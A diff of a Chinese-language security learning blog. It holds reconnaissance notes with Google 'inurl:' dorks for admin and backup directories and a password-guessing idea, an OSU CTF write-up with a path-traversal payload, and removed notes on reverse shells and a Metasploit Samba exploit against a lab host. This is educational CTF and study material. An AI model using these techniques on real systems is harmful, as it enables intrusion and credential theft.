+<td>搜尋網頁上的連結文字，而回傳該連結所指向的網頁</td>
+</tr>
+<tr>
+<td>link</td>
+<td>搜尋網頁中的連結</td>
+</tr>
+<tr>
+<td>filetype 和 ext</td>
+<td>搜尋特定類型的檔案</td>
+</tr>
+<tr>
+<td>site</td>
+<td>限制搜尋的對象，必須來自指定的網址或網域</td>
+</tr>
+<tr>
+<td>Daterange</td>
+<td></td>
+</tr>
+<tr>
+<td>after 和 before</td>
+<td>過濾在特定時間內被Google編入索引的網頁</td>
+</tr>
+<tr>
+<td>cache</td>
+<td>搜尋Google頁庫存檔中最近㇐次歸檔的網頁</td>
+</tr>
+<tr>
+<td>related</td>
+<td>查詢和指定的網址或URL有關聯的網頁</td>
+</tr>
+<tr>
+<td>numrange</td>
+<td>搜尋有指定範圍內數值的網頁</td>
+</tr>
+<tr>
+<td>define</td>
+<td>搜尋術語的定義</td>
+</tr>
+<tr>
+<td>location 和 source</td>
+<td>縮減新聞資料的搜尋範圍(常用在新聞搜尋)</td>
+</tr>
+<tr>
+<td>daterange</td>
+<td>• 日期數值只能輸入儒略日(Julian date)</td>
+</tr>
+<tr>
+<td>• 語法：</td>
+<td></td>
+</tr>
+<tr>
+<td>daterange：start_date-end_date</td>
+<td></td>
+</tr>
+<tr>
+<td>• 儒略日網址：</td>
+<td></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://ytliu0.github.io/ChineseCalenda">https://ytliu0.github.io/ChineseCalenda</a></td>
+<td></td>
+</tr>
+<tr>
+<td>r&#x2F;Julian_chinese.html</td>
+<td></td>
+</tr>
+<tr>
+<td>• 要搭配其他運算子使用(但link除外)</td>
+<td></td>
+</tr>
+<tr>
+<td>after 和 before</td>
+<td>• 語法：</td>
+</tr>
+<tr>
+<td>after:start_date before:end_date</td>
+<td></td>
+</tr>
+<tr>
+<td>• 日期格式：</td>
+<td></td>
+</tr>
+<tr>
+<td>西元年-月-日或西元年&#x2F;月&#x2F;日，但不能用 . 區隔</td>
+<td></td>
+</tr>
+<tr>
+<td>• Ex:</td>
+<td></td>
+</tr>
+<tr>
+<td>自由時報 after:2019-03-01 before:2019-03-05</td>
+<td></td>
+</tr>
+<tr>
+<td>• 起始日期晚於最後日期，則搜尋會被忽略</td>
+<td></td>
+</tr>
+<tr>
+<td>• 必須要搭配其他運算子使用，單獨使用不會回傳</td>
+<td></td>
+</tr>
+<tr>
+<td>任何結果</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>感興趣目錄</p>
+<table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>用途</th>
+<th>搜尋方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Admin</td>
+<td>• 存放管理功能的網頁</td>
+<td></td>
+</tr>
+<tr>
+<td>• 目錄可能用admin、administrator、</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>administration、adm命名</td>
+<td>「inurl:admin」</td>
+<td></td>
+</tr>
+<tr>
+<td>「inurl:adm」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Auth</td>
+<td>• 存放分配權限或認證的網頁</td>
+<td></td>
+</tr>
+<tr>
+<td>• 目錄可能用auth、authentic、</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>authentication命名</td>
+<td>「inurl:auth」</td>
+<td></td>
+</tr>
+<tr>
+<td>「inurl:authen」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Backup</td>
+<td>存放備份檔案&#x2F;程式版本</td>
+<td>「inurl:back」</td>
+</tr>
+<tr>
+<td>「inurl:bak」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>「inurl:bk」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Conf&#x2F;config&#x2F;settings</td>
+<td>組態設定檔</td>
+<td>「inurl:conf」</td>
+</tr>
+<tr>
+<td>「inurl:setting」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Download&#x2F;Files&#x2F;upload</td>
+<td>• 檔案上下載的目</td>
+<td></td>
+</tr>
+<tr>
+<td>• 檔案儲存的目錄</td>
+<td>「inurl:download」</td>
+<td></td>
+</tr>
+<tr>
+<td>「inurl:upload」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>「inurl:file」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>logfile</td>
+<td>程式或系統日誌檔</td>
+<td>「inurl:log」</td>
+</tr>
+<tr>
+<td>「inurl:logfile」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Login&#x2F;logon&#x2F;sso</td>
+<td>系統登入功能的網頁</td>
+<td>「inurl:login」</td>
+</tr>
+<tr>
+<td>「inurl:logon」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>manage</td>
+<td>存放管理功能的網頁</td>
+<td>「inurl:manag」</td>
+</tr>
+<tr>
+<td>「inurl:mgr」</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Temp&#x2F;tmp</td>
+<td>暫存區</td>
+<td>「inurl:temp」</td>
+</tr>
+<tr>
+<td>「inurl:tmp」71</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="Utilizing-Social-Media"><a href="#Utilizing-Social-Media" class="headerlink" title="Utilizing Social Media"></a><strong>Utilizing Social Media</strong></h3><p>利用社交媒體，查看目標相關資訊</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.linkedin.com/company/tesla-motors/">https://www.linkedin.com/company/tesla-motors/</a></p>
+<p>  <img src="/img/passive_Untitled_41.png" alt="Untitled"></p>
+</li>
+<li><p>從照片中看到人事物，都是值得做資料蒐集的對象</p>
+</li>
+<li><p>查看該組織人員</p>
+<ul>
+<li><p>透過人員資訊，也許幾萬名員工中有人密碼是弱密碼</p>
+</li>
+<li><p>可以利用這些資訊進行帳密爆破 &gt; 人員名稱當作密碼..</p>
+<p>  <img src="/img/passive_Untitled_42.png" alt="Untitled"></p>
+</li>
+</ul>
+</li>
+<li><p>社交媒體透漏多個個人資訊</p>
+</li>
+<li><p>深入挖掘訊息並蒐集</p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
+    <article id="osu-osu_ctf" class="article article-type-osu" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/osu_ctf/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.089Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/osu_ctf/">
+        OSU CTF
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>內容會慢慢更新…筆記整理中</p>
+<h3 id="Web-mikufanpage"><a href="#Web-mikufanpage" class="headerlink" title="Web&#x2F;mikufanpage"></a>Web&#x2F;mikufanpage</h3><p>url: <a target="_blank" rel="noopener" href="https://mikufanpage.web.osugaming.lol/">https://mikufanpage.web.osugaming.lol/</a></p>
+<p>這題在察看網頁後，看不出什麼，題目沒有提供太多有用訊息，但有給個網頁的建置檔案<br><img src="/img/osu2.png" alt="osu"></p>
+<p>所以在查看網頁原始碼後會注意到 <code>app.js</code> 的內容寫到，僅限制讀取 <code>img</code> 目錄下的 <code>.png</code> 及 <code>.jpg</code><br>意味者須要想個辦法去繞過這限制</p>
+<p>題外話，如果想把當前他給的網頁原始碼的檔案建立起來</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm init</span><br><span class="line">Command &#x27;npm&#x27; not found, but can be installed with:</span><br><span class="line">apt install npm</span><br><span class="line">Do you want to install it? (N/y)y</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# npm install express --save</span><br><span class="line"></span><br><span class="line">added 64 packages, and audited 65 packages in 2s</span><br><span class="line"></span><br><span class="line">12 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/mikufanpage]</span><br><span class="line">└─# node app.js               </span><br><span class="line">mikufanpage running on port 3000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> ?? <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">(<span class="params">err</span>) =&gt;</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!err) </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mikufanpage running on port &quot;</span>+ <span class="variable constant_">PORT</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Err &quot;</span>, err); </span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/image&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;png&quot;</span> || req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;jpg&quot;</span>) &#123; <span class="comment">// only allow images</span></span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;./img/&#x27;</span> + req.<span class="property">query</span>.<span class="property">path</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我們可以透過網頁也就是 <code>index.html</code> 內容中有寫到目前在輪流播放的圖片存取位置<br><img src="/img/osu3.png" alt="osu"></p>
+<p><code>/image?path=</code> 是個不錯的利用點，讓我想到應該可以利用LFI漏洞將flag.txt噴出來<br>之所以知道flag.txt是在img目錄下是因為題目提供的網頁原始檔中他們放在img目錄下</p>
+<p><img src="/img/osu4.png" alt="osu"></p>
+<p>開啟burp攔截封包並對url進行測試，其實在測了幾個後發現，常見的做法可能是</p>
+<ul>
+<li>flag.txt.png</li>
+<li>flag.txt%00</li>
+</ul>
+<p>但這些行不通，路徑中必須包含已經存在的png位置，摸索一番後…</p>
+<ul>
+<li>miku1.jpg..&#x2F;..&#x2F;..&#x2F;img&#x2F;flag.txt</li>
+</ul>
+<p><img src="/img/osu1.png" alt="osu"></p>
+<ul>
+<li>osu{miku_miku_miku_miku_miku_miku_miku_miku_….}</li>
+</ul>
+<hr>
+<h3 id="Reverse-SAT-before-osu"><a href="#Reverse-SAT-before-osu" class="headerlink" title="Reverse&#x2F;SAT-before-osu"></a>Reverse&#x2F;SAT-before-osu</h3><p>題目給了一個檔案需要解開他的謎題</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">b + c + w = 314</span><br><span class="line"></span><br><span class="line">t + d + u = 290</span><br><span class="line"></span><br><span class="line">p + w + e = 251</span><br><span class="line"></span><br><span class="line">v + l + j = 274</span><br><span class="line"></span><br><span class="line">a + t + b = 344</span><br><span class="line"></span><br><span class="line">b + j + m = 255</span><br><span class="line"></span><br><span class="line">h + o + u = 253</span><br><span class="line"></span><br><span class="line">q + l + o = 316</span><br><span class="line"></span><br><span class="line">a + g + j = 252</span><br><span class="line"></span><br><span class="line">q + x + q = 315</span><br><span class="line"></span><br><span class="line">t + n + m = 302</span><br><span class="line"></span><br><span class="line">d + b + g = 328</span><br><span class="line"></span><br><span class="line">e + o + m = 246</span><br><span class="line"></span><br><span class="line">v + v + u = 271</span><br><span class="line"></span><br><span class="line">f + o + q = 318</span><br><span class="line"></span><br><span class="line">s + o + j = 212</span><br><span class="line"></span><br><span class="line">j + j + n = 197</span><br><span class="line"></span><br><span class="line">s + u + l = 213</span><br><span class="line"></span><br><span class="line">q + w + j = 228</span><br><span class="line"></span><br><span class="line">i + d + r = 350</span><br><span class="line"></span><br><span class="line">e + k + u = 177</span><br><span class="line"></span><br><span class="line">w + n + a = 288</span><br><span class="line"></span><br><span class="line">r + e + u = 212</span><br><span class="line"></span><br><span class="line">q + l + f = 321</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>似乎每個方程式都代表字母表中三個字母的總和。我們可以解這些方程式來找出每個字母的數值。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"></span><br><span class="line">a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z = symbols(</span><br><span class="line">    <span class="string">&#x27;a b c d e f g h i j k l m n o p q r s t u v w x y z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定義了26個變數，每個變數代表英文字母a到z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定義一個包含多個方程的方程組，每個方程都是形如&quot;字母1 + 字母2 + 字母3 = 數值&quot;的形式。</span></span><br><span class="line">equations = [</span><br><span class="line">    Eq(b + c + w, <span class="number">314</span>),</span><br><span class="line">    Eq(t + d + u, <span class="number">290</span>),</span><br><span class="line">    Eq(p + w + e, <span class="number">251</span>),</span><br><span class="line">    Eq(v + l + j, <span class="number">274</span>),</span><br><span class="line">    Eq(a + t + b, <span class="number">344</span>),</span><br><span class="line">    Eq(b + j + m, <span class="number">255</span>),</span><br><span class="line">    Eq(h + o + u, <span class="number">253</span>),</span><br><span class="line">    Eq(q + l + o, <span class="number">316</span>),</span><br><span class="line">    Eq(a + g + j, <span class="number">252</span>),</span><br><span class="line">    Eq(q + x + q, <span class="number">315</span>),</span><br><span class="line">    Eq(t + n + m, <span class="number">302</span>),</span><br><span class="line">    Eq(d + b + g, <span class="number">328</span>),</span><br><span class="line">    Eq(e + o + m, <span class="number">246</span>),</span><br><span class="line">    Eq(v + v + u, <span class="number">271</span>),</span><br><span class="line">    Eq(f + o + q, <span class="number">318</span>),</span><br><span class="line">    Eq(s + o + j, <span class="number">212</span>),</span><br><span class="line">    Eq(j + j + n, <span class="number">197</span>),</span><br><span class="line">    Eq(s + u + l, <span class="number">213</span>),</span><br><span class="line">    Eq(q + w + j, <span class="number">228</span>),</span><br><span class="line">    Eq(i + d + r, <span class="number">350</span>),</span><br><span class="line">    Eq(e + k + u, <span class="number">177</span>),</span><br><span class="line">    Eq(w + n + a, <span class="number">288</span>),</span><br><span class="line">    Eq(r + e + u, <span class="number">212</span>),</span><br><span class="line">    Eq(q + l + f, <span class="number">321</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用solve函數來解這個方程組，找到符合所有方程式的字母對應數值</span></span><br><span class="line"><span class="comment"># solve(equations, variables)</span></span><br><span class="line">solution = solve(equations)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將字母對應的數值轉換為ASCII字符</span></span><br><span class="line"><span class="keyword">for</span> letter, value <span class="keyword">in</span> solution.items():</span><br><span class="line">    <span class="built_in">print</span>(letter, <span class="built_in">chr</span>(value))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>輸出</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a o</span><br><span class="line">b s</span><br><span class="line">c u</span><br><span class="line">d &#123;</span><br><span class="line">e 0</span><br><span class="line">f r</span><br><span class="line">g Z</span><br><span class="line">h _</span><br><span class="line">i p</span><br><span class="line">j 3</span><br><span class="line">k P</span><br><span class="line">l p</span><br><span class="line">m Y</span><br><span class="line">n _</span><br><span class="line">o m</span><br><span class="line">p y</span><br><span class="line">q _</span><br><span class="line">r s</span><br><span class="line">s 4</span><br><span class="line">t v</span><br><span class="line">u 1</span><br><span class="line">v o</span><br><span class="line">w R</span><br><span class="line">x &#125;</span><br></pre></td></tr></table></figure>
+
+<p>補充</p>
+<ul>
+<li>equations 是一個包含了26個方程式的列表，每個方程式表示三個字母的數字和等於一個特定的值。 </li>
+<li>variables 則是由我們定義的26個字母變數所組成的清單。</li>
+<li>透過呼叫 solve(equations)，嘗試求解方程組，並找到每個字母對應的數字值。</li>
+</ul>
+<hr>
+<h3 id="Web-when-you-dont-see-it"><a href="#Web-when-you-dont-see-it" class="headerlink" title="Web&#x2F;when-you-dont-see-it"></a>Web&#x2F;when-you-dont-see-it</h3><p>題目說在他的profile中有藏flag<br><a target="_blank" rel="noopener" href="https://osu.ppy.sh/users/11118671">https://osu.ppy.sh/users/11118671</a></p>
+<p>找了一下，在 F12 &gt; Sources &gt; users &gt; 11118671<br>全域搜尋下找到了flag<br><img src="/img/osu6.png" alt="osu"></p>
+<p>然後拿去 base64 decode<br><img src="/img/osu5.png" alt="osu"></p>
+<ul>
+<li>osu{ok_u_see_me}</li>
+</ul>
+<hr>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="post-Networking" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -2481,782 +3357,6 @@
 
 <p>並開啟網頁查看，可以看到成功繞過了CSP嵌入了iframe語法</p>
 <p><img src="/img/GoogleCTFCSP_5.png" alt="Untitled"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="exploit-Exploitation Basics" class="article article-type-exploit" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/Exploitation%20Basics/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.082Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Exploitation%20Basics/">
-        Exploitation Basics
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Exploitation-Basics"><a href="#Exploitation-Basics" class="headerlink" title="Exploitation Basics"></a>Exploitation Basics</h1><h3 id="Reverse-Shells-vs-Bind-Shells"><a href="#Reverse-Shells-vs-Bind-Shells" class="headerlink" title="Reverse Shells vs Bind Shells"></a>Reverse Shells vs Bind Shells</h3><p>參考文章:<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279849?sc=hot">https://ithelp.ithome.com.tw/articles/10279849?sc=hot</a></p>
-<ul>
-<li><p>所有的shell都是對機器的訪問</p>
-</li>
-<li><p>彈出shell -&gt; 可以訪問一台機器</p>
-</li>
-<li><p>reverse shell &gt; 受害者連接到攻擊機器</p>
-<p>  <img src="/img/exploit_Untitled.png" alt="Untitled"></p>
-<ul>
-<li>nc &gt; 監聽一個端口<ul>
-<li>lvp &gt; listening verbose part</li>
-<li>電腦打開某端口</li>
-</ul>
-</li>
-<li>在 &#x2F;bin&#x2F;sh 建立連線 &gt; 對象是 windows 是 cmd.exe</li>
-<li>攻擊者(local)端監聽任何對4444 port的發起的連線</li>
-<li>讓目標主機(受害者端)對攻擊者端的4444 port發起連線</li>
-<li>雙方建立連線後</li>
-</ul>
-<p>  <img src="/img/exploit_Untitled_1.png" alt="Untitled">
-  </p>
-</li>
-<li><p>bind shell &gt; 在機器上打開一個端口連接到目標</p>
-<p>  <img src="/img/exploit_Untitled_2.png" alt="Untitled"></p>
-<ul>
-<li>當使用nc在特定端口上連接到特定目標機器時，對方會監聽攻擊機器的連接</li>
-<li>綁定到目標(受害者)主機上的<strong>特定</strong>port來監聽傳入連接的shell，攻擊者會通過這port連到目標(受害)機器上</li>
-<li>先使用nc 將 &#x2F;bin&#x2F;sh 綁定受害機器上的4444port</li>
-<li>攻擊者在通過這個port連回受害機器</li>
-</ul>
-</li>
-<li><p>Reverse shell是從受害<strong>主機對攻擊者主機</strong>發起連線 &gt; 受害者連接到攻擊機</p>
-</li>
-<li><p>Bind Shell是先在受害主機上綁定特定port，然後等來自<strong>攻擊者主機對受害主機</strong>發起連線，就像後門(backdoor)一樣 &gt; 攻擊者可以連接到受害者</p>
-</li>
-</ul>
-<h3 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a><strong>Staged vs Non-Staged Payloads</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 	        Staged vs Non-Staged Payloads</span><br><span class="line">                              |</span><br><span class="line">          -----------------------------------</span><br><span class="line">          |                                 |</span><br><span class="line">    Staged Payloads                    Non-Staged Payloads</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Meterpreter         Shell       Reverse TCP              Bind TCP</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Multiple Stages      Single     Two-Part Payload        Single-Part Payload</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Smaller Size     Easier to use    Versatile            Larger Size</span><br></pre></td></tr></table></figure>
-
-<p>根據內容使用不同類型的payload</p>
-<p>exploit是利用漏洞的程式碼，而payload可以造成損害</p>
-<p>有些payload是我們用來發送給受害者並嘗試在機器上獲取shell的內容</p>
-<ul>
-<li><p>Non-staged</p>
-<ul>
-<li>Sends exploit shellcode all at once</li>
-<li>Larger in size and won’t always work</li>
-<li>Example: windows&#x2F;meterpreter_reverse_tcp</li>
-<li>此Payload被完整地發送，包括漏洞利用</li>
-<li>隨著利用的運行而整體全部發送出去</li>
-<li>Payload包括了所選任務的利用和全部shell程式碼</li>
-<li>一體化的負荷更加穩定</li>
-<li>這些Payload比其它類型Payload更大</li>
-</ul>
-</li>
-<li><p>Staged</p>
-<ul>
-<li>Sends payload in stages</li>
-<li>Can be less stable</li>
-<li>Example: windows&#x2F;meterpreter&#x2F;reverse_tcp</li>
-<li>指令中meterpreter後面有一個「**&#x2F;<strong>」字符，象徵一個</strong>Staged** Payload</li>
-<li>通常會被分成兩部分被發送</li>
-<li>第一個部分包含一個小的Payload，用來使受害機器回連攻擊者</li>
-<li>然後再傳輸第二個更大的Payload，這包含了剩餘的shellcode，然後整個Payload才能被執行</li>
-<li>這類載Payload可用於有大小限制的環境或是規避檢測</li>
-<li>透過網路載入這些元件會產生相當大的流量，並可能提醒防禦機制</li>
-<li><code>可以幫助規避防毒軟體</code></li>
-</ul>
-</li>
-<li><p>正<strong>斜線</strong>“ <strong>&#x2F;</strong> ”字元用於區分Non-staged Payload和Staged Payload。</p>
-</li>
-<li><p>Metasploit 框架將漏洞利用與成功利用後執行的內容（有效負載）分開</p>
-</li>
-<li><p>Metasploit框架中的有效負載也分為兩部分，stager和stage。</p>
-<ul>
-<li>stager 負責下載大的有效負載（階段），將其註入內存，並將執行傳遞給它</li>
-</ul>
-<p>  <img src="/img/exploit_Untitled_3.png" alt="Untitled">
-  </p>
-</li>
-<li><p>許多可利用的情況限制了攻擊者可以在不改變的情況下將多少位元組載入到記憶體中的一個連續位置</p>
-</li>
-<li><p>這些情況下進行有趣的後期利用的一種方法是分階段交付Payload</p>
-</li>
-<li><p>Stagers 通常是用手工優化的彙編語言編寫的。攻擊者的目標是使 stager 盡可能小</p>
-</li>
-<li><p>小型 stager 使攻擊者可以自由地使用它進行更多攻擊</p>
-</li>
-</ul>
-<h3 id="Gaining-Root-with-Metasploit"><a href="#Gaining-Root-with-Metasploit" class="headerlink" title="Gaining Root with Metasploit"></a><strong>Gaining Root with Metasploit</strong></h3><p>根據之前的掃描結果</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] 192.168.19.140:139    -   Host could not be identified: Unix (**Samba 2.2.1a**)</span><br></pre></td></tr></table></figure>
-
-<p>利用searchploit尋找發現的服務版本漏洞</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# searchsploit samba 2.2    </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x/2.2 - Arbitrary File Creation                                    | unix/remote/20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                 | osx/remote/9924.rb</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">****Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow      | unix/remote/22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                         | linux/remote/7.pl</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                        | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                | linux_x86/dos/36741.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
-
-<p>開啟msf利用該漏洞</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search samba 2.2</span><br><span class="line">                                                                                                               </span><br><span class="line">Matching Modules                                                                                               </span><br><span class="line">================                                                                                               </span><br><span class="line">                                                                                                               </span><br><span class="line">   <span class="comment">#  Name                              Disclosure Date  Rank     Check  Description                           </span></span><br><span class="line">   -  ----                              ---------------  ----     -----  -----------                                          </span><br><span class="line">   0  exploit/multi/samba/nttrans       2003-04-07       average  No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   1  exploit/freebsd/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   **2  exploit/linux/samba/trans2open    2003-04-07       great    No     Samba trans2open Overflow (Linux x86)**</span><br><span class="line">   3  exploit/osx/samba/trans2open      2003-04-07       great    No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   4  exploit/solaris/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/trans2open</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/linux/samba/trans2open</span><br><span class="line">[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 